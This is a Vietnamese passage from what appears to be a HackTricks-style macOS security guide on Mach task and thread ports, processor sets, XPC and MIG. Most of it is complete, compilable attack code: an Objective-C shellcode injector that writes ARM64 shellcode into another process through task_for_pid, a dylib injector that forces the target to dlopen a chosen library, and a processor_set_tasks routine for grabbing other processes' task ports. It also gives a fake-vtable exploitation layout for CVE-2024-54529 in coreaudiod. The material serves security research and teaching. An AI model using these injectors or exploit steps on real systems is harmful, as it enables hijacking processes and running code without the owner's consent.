- Đây là các hạn chế khi truy cập port (từ `macos_task_policy` trong binary `AppleMobileFileIntegrity`):
  - Nếu app có **entitlement `com.apple.security.get-task-allow`**, các process của **cùng user có thể truy cập task port** (thường được Xcode thêm vào để debug). Quy trình **notarization** sẽ không cho phép entitlement này trong các bản phát hành production.
  - App có entitlement **`com.apple.system-task-ports`** có thể lấy **task port của bất kỳ** process nào, ngoại trừ kernel. Trong các phiên bản cũ, entitlement này có tên **`task_for_pid-allow`**. Entitlement này chỉ được cấp cho các ứng dụng Apple.
  - **Root có thể truy cập task port** của các ứng dụng **không** được biên dịch với runtime **hardened** (và không phải ứng dụng của Apple).

**Task name port:** Phiên bản không có đặc quyền của _task port_. Nó tham chiếu đến task nhưng không cho phép điều khiển task đó. Có vẻ như thao tác duy nhất khả dụng thông qua port này là `task_info()`.

### Thread Ports

Các thread cũng có port tương ứng, có thể được xem từ task gọi **`task_threads`** và từ processor thông qua `processor_set_threads`. Quyền SEND trên thread port cho phép sử dụng các hàm trong subsystem `thread_act`, chẳng hạn như:

- `thread_terminate`
- `thread_[get/set]_state`
- `act_[get/set]_state`
- `thread_[suspend/resume]`
- `thread_info`
- ...

Mọi thread đều có thể lấy port này bằng cách gọi **`mach_thread_sef`**.

### Shellcode Injection vào thread qua Task port

Bạn có thể lấy shellcode từ:


{{#ref}}
../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md
{{#endref}}

{{#tabs}}
{{#tab name="mysleep.m"}}

```objectivec
// clang -framework Foundation mysleep.m -o mysleep
// codesign --entitlements entitlements.plist -s - mysleep

#import <Foundation/Foundation.h>

double performMathOperations() {
    double result = 0;
    for (int i = 0; i < 10000; i++) {
        result += sqrt(i) * tan(i) - cos(i);
    }
    return result;
}

int main(int argc, const char * argv[]) {
    @autoreleasepool {
        NSLog(@"Process ID: %d", [[NSProcessInfo processInfo]
processIdentifier]);
        while (true) {
            [NSThread sleepForTimeInterval:5];

            performMathOperations();  // Silent action

            [NSThread sleepForTimeInterval:5];
        }
    }
    return 0;
}
```

{{#endtab}}

{{#tab name="entitlements.plist"}}

```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>com.apple.security.get-task-allow</key>
    <true/>
</dict>
</plist>
```

{{#endtab}}
{{#endtabs}}

**Biên dịch** chương trình trước đó và thêm **entitlements** để có thể inject code với cùng người dùng (nếu không, bạn sẽ cần dùng **sudo**).<sup>[[3]](#references)</sup>

<details>

<summary>sc_injector.m</summary>

```objectivec
// gcc -framework Foundation -framework Appkit sc_injector.m -o sc_injector
// Based on https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a?permalink_comment_id=2981669
// and on https://newosxbook.com/src.jl?tree=listings&file=inject.c


#import <Foundation/Foundation.h>
#import <AppKit/AppKit.h>
#include <mach/mach_vm.h>
#include <sys/sysctl.h>


#ifdef __arm64__

kern_return_t mach_vm_allocate
(
        vm_map_t target,
        mach_vm_address_t *address,
        mach_vm_size_t size,
        int flags
);

kern_return_t mach_vm_write
(
        vm_map_t target_task,
        mach_vm_address_t address,
        vm_offset_t data,
        mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128

// ARM64 shellcode that executes touch /tmp/lalala
char injectedCode[] = "\xff\x03\x01\xd1\xe1\x03\x00\x91\x60\x01\x00\x10\x20\x00\x00\xf9\x60\x01\x00\x10\x20\x04\x00\xf9\x40\x01\x00\x10\x20\x08\x00\xf9\x3f\x0c\x00\xf9\x80\x00\x00\x10\xe2\x03\x1f\xaa\x70\x07\x80\xd2\x01\x00\x00\xd4\x2f\x62\x69\x6e\x2f\x73\x68\x00\x2d\x63\x00\x00\x74\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x6c\x61\x6c\x61\x6c\x61\x00";


int inject(pid_t pid){

    task_t remoteTask;

    // Get access to the task port of the process we want to inject into
    kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
    if (kr != KERN_SUCCESS) {
        fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
        return (-1);
    }
    else{
        printf("Gathered privileges over the task port of process: %d\n", pid);
    }

    // Allocate memory for the stack
    mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
    mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
    kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

    if (kr != KERN_SUCCESS)
    {
        fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
        return (-2);
    }
    else
    {

        fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
    }

    // Allocate memory for the code
    remoteCode64 = (vm_address_t) NULL;
    kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

    if (kr != KERN_SUCCESS)
    {
        fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
        return (-2);
    }


    // Write the shellcode to the allocated memory
    kr = mach_vm_write(remoteTask,                   // Task port
	                   remoteCode64,                 // Virtual Address (Destination)
	                   (vm_address_t) injectedCode,  // Source
	                    0xa9);                       // Length of the source


    if (kr != KERN_SUCCESS)
    {
	fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
	return (-3);
    }


    // Set the permissions on the allocated code memory
    kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

    if (kr != KERN_SUCCESS)
    {
	fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
	return (-4);
    }

    // Set the permissions on the allocated stack memory
    kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

    if (kr != KERN_SUCCESS)
    {
	fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
	return (-4);
    }

    // Create thread to run shellcode
    struct arm_unified_thread_state remoteThreadState64;
    thread_act_t         remoteThread;

    memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

    remoteStack64 += (STACK_SIZE / 2); // this is the real stack
        //remoteStack64 -= 8;  // need alignment of 16

    const char* p = (const char*) remoteCode64;

    remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
    remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
    remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
    remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

    printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

    kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
    (thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

    if (kr != KERN_SUCCESS) {
        fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
        return (-3);
    }

    return (0);
}

pid_t pidForProcessName(NSString *processName) {
    NSArray *arguments = @[@"pgrep", processName];
    NSTask *task = [[NSTask alloc] init];
    [task setLaunchPath:@"/usr/bin/env"];
    [task setArguments:arguments];

    NSPipe *pipe = [NSPipe pipe];
    [task setStandardOutput:pipe];

    NSFileHandle *file = [pipe fileHandleForReading];

    [task launch];

    NSData *data = [file readDataToEndOfFile];
    NSString *string = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];

    return (pid_t)[string integerValue];
}

BOOL isStringNumeric(NSString *str) {
    NSCharacterSet* nonNumbers = [[NSCharacterSet decimalDigitCharacterSet] invertedSet];
    NSRange r = [str rangeOfCharacterFromSet: nonNumbers];
    return r.location == NSNotFound;
}

int main(int argc, const char * argv[]) {
    @autoreleasepool {
        if (argc < 2) {
            NSLog(@"Usage: %s <pid or process name>", argv[0]);
            return 1;
        }

        NSString *arg = [NSString stringWithUTF8String:argv[1]];
        pid_t pid;

        if (isStringNumeric(arg)) {
            pid = [arg intValue];
        } else {
            pid = pidForProcessName(arg);
            if (pid == 0) {
                NSLog(@"Error: Process named '%@' not found.", arg);
                return 1;
            }
            else{
                printf("Found PID of process '%s': %d\n", [arg UTF8String], pid);
            }
        }

        inject(pid);
    }

    return 0;
}
```

</details>

```bash
gcc -framework Foundation -framework Appkit sc_inject.m -o sc_inject
./inject <pi or string>
```

> [!TIP]
> Để cách này hoạt động trên iOS, bạn cần entitlement `dynamic-codesigning` để có thể tạo vùng nhớ vừa có thể ghi vừa có thể thực thi.

### Dylib Injection trong thread qua Task port

Trong macOS, **threads** có thể được thao tác thông qua **Mach** hoặc dùng **API `pthread` của posix**. Thread được tạo trong lần injection trước đó sử dụng API Mach, nên **không tương thích với posix**.

Có thể **inject một shellcode đơn giản** để thực thi lệnh vì nó **không cần hoạt động với các API tương thích posix**, mà chỉ cần Mach. **Các injection phức tạp hơn** sẽ cần **thread** cũng **tương thích với posix**.

Do đó, để **cải thiện thread**, nó nên gọi **`pthread_create_from_mach_thread`** để **tạo một pthread hợp lệ**. Sau đó, pthread mới này có thể **gọi dlopen** để **load một dylib** từ hệ thống. Như vậy, thay vì viết shellcode mới để thực hiện các hành động khác nhau, ta có thể load các thư viện tùy chỉnh.<sup>[[2]](#references)</sup>

Bạn có thể tìm thấy **các dylib mẫu** tại đây (ví dụ: dylib tạo log để bạn có thể nghe log):


{{#ref}}
../macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md
{{#endref}}

<details>

<summary>dylib_injector.m</summary>

```objectivec
// gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
// Based on http://newosxbook.com/src.jl?tree=listings&file=inject.c
#include <dlfcn.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <mach/mach.h>
#include <mach/error.h>
#include <errno.h>
#include <stdlib.h>
#include <sys/sysctl.h>
#include <sys/mman.h>

#include <sys/stat.h>
#include <pthread.h>


#ifdef __arm64__
//#include "mach/arm/thread_status.h"

// Apple says: mach/mach_vm.h:1:2: error: mach_vm.h unsupported
// And I say, bullshit.
kern_return_t mach_vm_allocate
(
        vm_map_t target,
        mach_vm_address_t *address,
        mach_vm_size_t size,
        int flags
);

kern_return_t mach_vm_write
(
        vm_map_t target_task,
        mach_vm_address_t address,
        vm_offset_t data,
        mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128


char injectedCode[] =

    // "\x00\x00\x20\xd4" // BRK X0     ; // useful if you need a break :)

    // Call pthread_set_self

    "\xff\x83\x00\xd1" // SUB SP, SP, #0x20         ; Allocate 32 bytes of space on the stack for local variables
    "\xFD\x7B\x01\xA9" // STP X29, X30, [SP, #0x10] ; Save frame pointer and link register on the stack
    "\xFD\x43\x00\x91" // ADD X29, SP, #0x10        ; Set frame pointer to current stack pointer
    "\xff\x43\x00\xd1" // SUB SP, SP, #0x10         ; Space for the
    "\xE0\x03\x00\x91" // MOV X0, SP                ; (arg0)Store in the stack the thread struct
    "\x01\x00\x80\xd2" // MOVZ X1, 0                ; X1 (arg1) = 0;
    "\xA2\x00\x00\x10" // ADR X2, 0x14              ; (arg2)12bytes from here, Address where the new thread should start
    "\x03\x00\x80\xd2" // MOVZ X3, 0                ; X3 (arg3) = 0;
    "\x68\x01\x00\x58" // LDR X8, #44               ; load address of PTHRDCRT (pthread_create_from_mach_thread)
    "\x00\x01\x3f\xd6" // BLR X8                    ; call pthread_create_from_mach_thread
    "\x00\x00\x00\x14" // loop: b loop              ; loop forever

    // Call dlopen with the path to the library
    "\xC0\x01\x00\x10"  // ADR X0, #56  ; X0 => "LIBLIBLIB...";
    "\x68\x01\x00\x58"  // LDR X8, #44 ; load DLOPEN
    "\x01\x00\x80\xd2"  // MOVZ X1, 0 ; X1 = 0;
    "\x29\x01\x00\x91"  // ADD   x9, x9, 0  - I left this as a nop
    "\x00\x01\x3f\xd6"  // BLR X8     ; do dlopen()

    // Call pthread_exit
    "\xA8\x00\x00\x58"  // LDR X8, #20 ; load PTHREADEXT
    "\x00\x00\x80\xd2"  // MOVZ X0, 0 ; X1 = 0;
    "\x00\x01\x3f\xd6"  // BLR X8     ; do pthread_exit

    "PTHRDCRT"  // <-
    "PTHRDEXT"  // <-
    "DLOPEN__"  // <-
    "LIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIB"
    "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
    "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
    "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
    "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
    "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" ;




int inject(pid_t pid, const char *lib) {

    task_t remoteTask;
    struct stat buf;

    // Check if the library exists
    int rc = stat (lib, &buf);

    if (rc != 0)
    {
        fprintf (stderr, "Unable to open library file %s (%s) - Cannot inject\n", lib,strerror (errno));
        //return (-9);
    }

    // Get access to the task port of the process we want to inject into
    kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
    if (kr != KERN_SUCCESS) {
        fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
        return (-1);
    }
    else{
        printf("Gathered privileges over the task port of process: %d\n", pid);
    }

    // Allocate memory for the stack
    mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
    mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
    kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

    if (kr != KERN_SUCCESS)
    {
        fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
        return (-2);
    }
    else
    {

        fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
    }

    // Allocate memory for the code
    remoteCode64 = (vm_address_t) NULL;
    kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

    if (kr != KERN_SUCCESS)
    {
        fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
        return (-2);
    }


    // Patch shellcode

    int i = 0;
    char *possiblePatchLocation = (injectedCode );
    for (i = 0 ; i < 0x100; i++)
    {

        // Patching is crude, but works.
        //
        extern void *_pthread_set_self;
        possiblePatchLocation++;


        uint64_t addrOfPthreadCreate = dlsym ( RTLD_DEFAULT, "pthread_create_from_mach_thread"); //(uint64_t) pthread_create_from_mach_thread;
        uint64_t addrOfPthreadExit = dlsym (RTLD_DEFAULT, "pthread_exit"); //(uint64_t) pthread_exit;
        uint64_t addrOfDlopen = (uint64_t) dlopen;

        if (memcmp (possiblePatchLocation, "PTHRDEXT", 8) == 0)
        {
            memcpy(possiblePatchLocation, &addrOfPthreadExit,8);
            printf ("Pthread exit  @%llx, %llx\n", addrOfPthreadExit, pthread_exit);
        }

        if (memcmp (possiblePatchLocation, "PTHRDCRT", 8) == 0)
        {
            memcpy(possiblePatchLocation, &addrOfPthreadCreate,8);
            printf ("Pthread create from mach thread @%llx\n", addrOfPthreadCreate);
        }

        if (memcmp(possiblePatchLocation, "DLOPEN__", 6) == 0)
        {
            printf ("DLOpen @%llx\n", addrOfDlopen);
            memcpy(possiblePatchLocation, &addrOfDlopen, sizeof(uint64_t));
        }

        if (memcmp(possiblePatchLocation, "LIBLIBLIB", 9) == 0)
        {
            strcpy(possiblePatchLocation, lib );
        }
    }

	// Write the shellcode to the allocated memory
    kr = mach_vm_write(remoteTask,                   // Task port
	                   remoteCode64,                 // Virtual Address (Destination)
	                   (vm_address_t) injectedCode,  // Source
	                    0xa9);                       // Length of the source


    if (kr != KERN_SUCCESS)
    {
        fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
        return (-3);
    }


    // Set the permissions on the allocated code memory
    kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

    if (kr != KERN_SUCCESS)
    {
        fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
        return (-4);
    }

    // Set the permissions on the allocated stack memory
    kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

    if (kr != KERN_SUCCESS)
    {
        fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
        return (-4);
    }


    // Create thread to run shellcode
    struct arm_unified_thread_state remoteThreadState64;
    thread_act_t         remoteThread;

    memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

    remoteStack64 += (STACK_SIZE / 2); // this is the real stack
        //remoteStack64 -= 8;  // need alignment of 16

    const char* p = (const char*) remoteCode64;

    remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
    remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
    remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
    remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

    printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

    kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
    (thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

    if (kr != KERN_SUCCESS) {
        fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
        return (-3);
    }

    return (0);
}



int main(int argc, const char * argv[])
{
    if (argc < 3)
	{
		fprintf (stderr, "Usage: %s _pid_ _action_\n", argv[0]);
		fprintf (stderr, "   _action_: path to a dylib on disk\n");
		exit(0);
	}

    pid_t pid = atoi(argv[1]);
    const char *action = argv[2];
    struct stat buf;

    int rc = stat (action, &buf);
    if (rc == 0) inject(pid,action);
    else
    {
        fprintf(stderr,"Dylib not found\n");
    }

}
```

</details>

```bash
gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
./inject <pid-of-mysleep> </path/to/lib.dylib>
```

### Thread Hijacking via Task port <a href="#step-1-thread-hijacking" id="step-1-thread-hijacking"></a>

Trong kỹ thuật này, một thread của process bị chiếm quyền điều khiển:


{{#ref}}
macos-thread-injection-via-task-port.md
{{#endref}}

### Phát hiện Task Port Injection

Khi gọi `task_for_pid` hoặc `thread_create_*`, một bộ đếm trong struct task của kernel sẽ tăng. Có thể truy cập bộ đếm này từ user mode bằng cách gọi task_info(task, TASK_EXTMOD_INFO, ...)

## Exception Ports

Khi xảy ra exception trong một thread, exception đó được gửi đến exception port được chỉ định cho thread. Nếu thread không xử lý, exception sẽ được gửi đến các task exception port. Nếu task không xử lý, exception sẽ được gửi đến host port do launchd quản lý (nơi nó được xác nhận). Quá trình này được gọi là exception triage.

Lưu ý rằng cuối cùng, nếu không được xử lý đúng cách, báo cáo thường sẽ được daemon ReportCrash xử lý. Tuy nhiên, một thread khác trong cùng task cũng có thể xử lý exception; đây là cách các công cụ báo cáo crash như `PLCreashReporter` hoạt động.

## Các đối tượng khác

### Clock

Bất kỳ user nào cũng có thể truy cập thông tin về clock, nhưng cần có quyền root để đặt thời gian hoặc thay đổi các cài đặt khác.

Để lấy thông tin, có thể gọi các hàm từ subsystem `clock`, chẳng hạn như: `clock_get_time`, `clock_get_attributtes` hoặc `clock_alarm`\
Để thay đổi giá trị, có thể dùng subsystem `clock_priv` với các hàm như `clock_set_time` và `clock_set_attributes`

### Processors và Processor Set

Các API processor cho phép kiểm soát một logical processor thông qua những hàm như `processor_start`, `processor_exit`, `processor_info` và `processor_get_assignment`.

Ngoài ra, các API **processor set** cung cấp cách nhóm nhiều processor lại với nhau. Có thể lấy processor set mặc định bằng cách gọi **`processor_set_default`**.\
Dưới đây là một số API đáng chú ý để tương tác với processor set:

- `processor_set_statistics`
- `processor_set_tasks`: Trả về một mảng send right đến tất cả task bên trong processor set
- `processor_set_threads`: Trả về một mảng send right đến tất cả thread bên trong processor set
- `processor_set_stack_usage`
- `processor_set_info`

Như đã đề cập trong [**bài viết này**](https://reverse.put.as/2014/05/05/about-the-processor_set_tasks-access-to-kernel-memory-vulnerability/), trước đây, cách này cho phép vượt qua cơ chế bảo vệ đã đề cập ở trên để lấy task port của các process khác và kiểm soát chúng bằng cách gọi **`processor_set_tasks`**, đồng thời lấy host port trên từng process.<sup>[[10]](#references)</sup>\
Ngày nay, cần có quyền root để dùng hàm đó. Cơ chế này đã được bảo vệ, vì vậy bạn chỉ có thể lấy các port này trên những process không được bảo vệ.<sup>[[10]](#references)</sup>

Bạn có thể thử với:

<details>

<summary><strong>mã processor_set_tasks</strong></summary>

````c
// Main part of the code from https://newosxbook.com/articles/PST2.html
//gcc ./port_pid.c -o port_pid

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/sysctl.h>
#include <libproc.h>
#include <mach/mach.h>
#include <errno.h>
#include <string.h>
#include <mach/exception_types.h>
#include <mach/mach_host.h>
#include <mach/host_priv.h>
#include <mach/processor_set.h>
#include <mach/mach_init.h>
#include <mach/mach_port.h>
#include <mach/vm_map.h>
#include <mach/task.h>
#include <mach/task_info.h>
#include <mach/mach_traps.h>
#include <mach/mach_error.h>
#include <mach/thread_act.h>
#include <mach/thread_info.h>
#include <mach-o/loader.h>
#include <mach-o/nlist.h>
#include <sys/ptrace.h>

mach_port_t task_for_pid_workaround(int Pid)
{

  host_t        myhost = mach_host_self(); // host self is host priv if you're root anyway..
  mach_port_t   psDefault;
  mach_port_t   psDefault_control;

  task_array_t  tasks;
  mach_msg_type_number_t numTasks;
  int i;

   thread_array_t       threads;
   thread_info_data_t   tInfo;

  kern_return_t kr;

  kr = processor_set_default(myhost, &psDefault);

  kr = host_processor_set_priv(myhost, psDefault, &psDefault_control);
 if (kr != KERN_SUCCESS) { fprintf(stderr, "host_processor_set_priv failed with error %x\n", kr);
         mach_error("host_processor_set_priv",kr); exit(1);}

  printf("So far so good\n");

  kr = processor_set_tasks(psDefault_control, &tasks, &numTasks);
  if (kr != KERN_SUCCESS) { fprintf(stderr,"processor_set_tasks failed with error %x\n",kr); exit(1); }

  for (i = 0; i < numTasks; i++)
        {
                int pid;
                pid_for_task(tasks[i], &pid);
                printf("TASK %d PID :%d\n", i,pid);
				char pathbuf[PROC_PIDPATHINFO_MAXSIZE];
				if (proc_pidpath(pid, pathbuf, sizeof(pathbuf)) > 0) {
					printf("Command line: %s\n", pathbuf);
				} else {
					printf("proc_pidpath failed: %s\n", strerror(errno));
				}
            if (pid == Pid){
                printf("Found\n");
                return (tasks[i]);
            }
        }

   return (MACH_PORT_NULL);
} // end workaround



int main(int argc, char *argv[]) {
    /*if (argc != 2) {
        fprintf(stderr, "Usage: %s <PID>\n", argv[0]);
        return 1;
    }

    pid_t pid = atoi(argv[1]);
    if (pid <= 0) {
        fprintf(stderr, "Invalid PID. Please enter a numeric value greater than 0.\n");
        return 1;
    }*/

    int pid = 1;

    task_for_pid_workaround(pid);
    return 0;
}

```
````

</details>

## XPC

### Thông tin cơ bản

XPC, viết tắt của XNU (kernel được macOS sử dụng) inter-Process Communication, là một framework **giao tiếp giữa các process** trên macOS và iOS. XPC cung cấp cơ chế để thực hiện **các lời gọi phương thức an toàn, bất đồng bộ giữa các process khác nhau** trên hệ thống. Đây là một phần trong mô hình bảo mật của Apple, cho phép **tạo các ứng dụng phân tách đặc quyền**, trong đó mỗi **thành phần** chỉ chạy với **các quyền cần thiết** để thực hiện nhiệm vụ, qua đó hạn chế thiệt hại tiềm ẩn từ một process bị xâm nhập.

Để biết thêm thông tin về cách thức **giao tiếp này hoạt động** và cách nó **có thể dễ bị tấn công**, hãy xem:


{{#ref}}
macos-xpc/
{{#endref}}

## MIG - Mach Interface Generator

MIG được tạo ra để **đơn giản hóa quá trình tạo mã Mach IPC**. Lý do là phần lớn công việc lập trình RPC đều lặp lại những thao tác giống nhau (đóng gói đối số, gửi msg, giải đóng gói dữ liệu ở server...).

Về cơ bản, MIG **tạo mã cần thiết** để server và client giao tiếp dựa trên một định nghĩa nhất định (bằng IDL -Interface Definition language-). Dù mã được tạo ra không đẹp, developer chỉ cần import mã đó và phần code của họ sẽ đơn giản hơn nhiều.

Để biết thêm thông tin, hãy xem:


{{#ref}}
macos-mig-mach-interface-generator.md
{{#endref}}

## MIG handler type confusion -> fake vtable pointer-chain hijack

Nếu MIG handler **lấy một đối tượng C++ bằng ID do Mach message cung cấp** (ví dụ: từ Object Map nội bộ), rồi **giả định đối tượng đó thuộc một kiểu cụ thể mà không xác thực kiểu động thực tế**, các lời gọi virtual về sau có thể được dispatch thông qua những con trỏ do attacker kiểm soát. Trong service `com.apple.audio.audiohald` của `coreaudiod` (CVE-2024-54529), `_XIOContext_Fetch_Workgroup_Port` dùng `HALS_Object` được tra cứu như một `ioct` và thực thi lời gọi vtable thông qua:<sup>[[9]](#references)</sup>

```asm
mov rax, qword ptr [rdi]
call qword ptr [rax + 0x168]  ; indirect call through vtable slot
```

Vì `rax` xuất phát từ **nhiều lần dereference**, việc khai thác cần một chuỗi con trỏ có cấu trúc thay vì chỉ ghi đè một lần. Một bố cục hoạt động:

1. Trong **đối tượng heap bị nhầm lẫn** (được xử lý như `ioct`), đặt một **con trỏ tại +0x68** trỏ đến vùng nhớ do attacker kiểm soát.
2. Tại vùng nhớ đó, đặt một **con trỏ tại +0x0** trỏ đến một **fake vtable**.
3. Trong fake vtable, ghi **địa chỉ đích của lệnh gọi tại +0x168**, để handler nhảy đến đoạn code do attacker chọn khi dereference `[rax+0x168]`.

Về mặt khái niệm:

```
HALS_Object + 0x68  -> controlled_object
*(controlled_object + 0x0) -> fake_vtable
*(fake_vtable + 0x168)     -> RIP target
```

### Triage bằng LLDB để định vị gadget

1. **Đặt breakpoint tại handler gây lỗi** (hoặc `mach_msg`/`dispatch_mig_server`) rồi kích hoạt crash để xác nhận chuỗi dispatch (`HALB_MIGServer_server -> dispatch_mig_server -> _XIOContext_Fetch_Workgroup_Port`).
2. Trong frame gây crash, disassemble để ghi lại **offset của vị trí gọi gián tiếp** (`call qword ptr [rax + 0x168]`).
3. Kiểm tra các register/bộ nhớ để xác minh nguồn gốc của `rdi` (đối tượng cơ sở) và `rax` (con trỏ vtable), đồng thời xem các offset trên có thể truy cập bằng dữ liệu được kiểm soát hay không.
4. Dùng sơ đồ offset để heap-shape chuỗi **0x68 -> 0x0 -> 0x168** và biến lỗi nhầm kiểu thành một vụ chiếm quyền điều khiển luồng thực thi đáng tin cậy bên trong Mach service.

## References

- [1] [Mach Ports – Tài liệu Darling](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)
- [2] [Chèn mã trên macOS – knight.sc](https://knight.sc/malware/2019/03/15/code-injection-on-macos.html)
- [3] [knightsc/inject.c – Chèn dylib bằng dlopen vào Mach task từ xa (Gist)](https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a)
- [4] [Đừng nói cùng lúc: Nâng cao đặc quyền trên macOS bằng cách giả mạo audit token – Sector 7](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
- [5] [XNU — `osfmk/mach/message.h` (cấu trúc và cờ của Mach message)](https://github.com/apple-oss-distributions/xnu/blob/main/osfmk/mach/message.h)
- [6] [XNU — `osfmk/mach/mach_port.defs` (giao diện MIG để thao tác port)](https://github.com/apple-oss-distributions/xnu/blob/main/osfmk/mach/mach_port.defs)
- [7] [XNU — `osfmk/mach/task.defs` (`task_for_pid`, các thao tác với thread/task port)](https://github.com/apple-oss-distributions/xnu/blob/main/osfmk/mach/task.defs)
- [8] [task_get_special_port – Sổ tay MIT Darwin XNU](https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task_get_special_port.html)
- [9] [Project Zero – Rào chắn âm thanh 2](https://projectzero.google/2026/01/sound-barrier-2.html)
- [10] [Về lỗ hổng truy cập bộ nhớ kernel của processor_set_tasks() – reverse.put.as](https://reverse.put.as/2014/05/05/about-the-processor_set_tasks-access-to-kernel-memory-vulnerability/)
- [11] [XNU — `osfmk/ipc/ipc_port.h` (các quyền và nội bộ của port)](https://github.com/apple-oss-distributions/xnu/blob/main/osfmk/ipc/ipc_port.h)
{{#include ../../../../banners/hacktricks-training.md}}
